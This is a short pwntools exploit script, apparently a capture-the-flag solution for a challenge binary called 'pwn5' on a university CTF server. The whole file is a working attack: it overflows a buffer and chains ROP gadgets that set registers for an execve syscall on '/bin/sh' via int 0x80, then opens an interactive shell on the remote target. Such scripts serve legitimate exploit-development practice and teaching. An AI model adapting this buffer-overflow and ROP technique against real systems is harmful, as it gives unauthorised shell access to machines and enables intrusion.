from pwn import *
context.log_level='debug'
context.terminal=['gnome-terminal','-x','sh','-c']

p=process('pwn5')
p=remote('ctf.nefu.edu.cn',32768)
elf=ELF('./pwn5')
if args.G:
	gdb.attach(p)
	pause()

pop_eax=0x080484d3
pop_ebx=0x0804834d
pop_ecx=0x080484d7
pop_edx=0x080484d9
binsh=0x0804a024
int_80=0x080484e6
payload=b'a'*0x20+p32(pop_eax)+p32(0xb)+p32(pop_ebx)+p32(binsh)+p32(pop_ecx)+p32(0)+p32(pop_edx)+p32(0)+p32(int_80)
p.sendline(payload)
p.interactive()
